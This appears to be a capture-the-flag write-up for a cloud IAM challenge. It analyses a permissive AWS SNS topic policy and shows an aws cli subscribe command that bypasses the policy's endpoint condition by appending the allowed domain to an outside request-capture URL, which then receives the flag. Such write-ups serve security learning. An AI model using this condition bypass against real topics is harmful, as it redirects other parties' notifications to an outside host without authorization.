# Challenge number 3

## Challenge Statement
This challenge involves setting up AWS SNS (Simple Notification Service) push notifications and handling them using a Flask web application. The objective is to subscribe to an SNS topic, confirm the subscription, and receive notifications via an HTTP endpoin

## IAM Policy

    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]

    

## Analysis about the IAM policy

The given IAM policy is an AWS SNS topic policy that allows anyone ("Principal": {"AWS": "*"}) to subscribe to the SNS topic TBICWizPushNotifications. The "Effect": "Allow" statement grants the SNS:Subscribe permission to all users. However, there is a condition restricting the subscription to endpoints that match the pattern *@tbic.wiz.io ("sns:Endpoint": "*@tbic.wiz.io"), ensuring only email addresses or URLs associated with this domain can subscribe. While this policy enables broad access, it should be carefully managed to prevent unauthorized subscriptions.

## Solution

At the time of solving & writing the solution I got stuck in the challenge since my endpoint could not recieve the SNS confirmation message in our webhook using the code below:

aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint *@tbic.wiz.io

Therefore, using a request capture site and its url i was able to capture the request that carried the flag. Here's the code below:
 
 aws sns subscribe 
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications 
    --protocol https 
    --notification-endpoint 'https://anmol.requestcatcher.com/test @tbic.wiz.io'
    
## Reflection
Solving this challenge provided valuable hands-on experience with AWS SNS (Simple Notification Service) and Flask for handling webhooks. It reinforced critical concepts such as API integration, HTTP request handling, and cloud-based messaging systems.
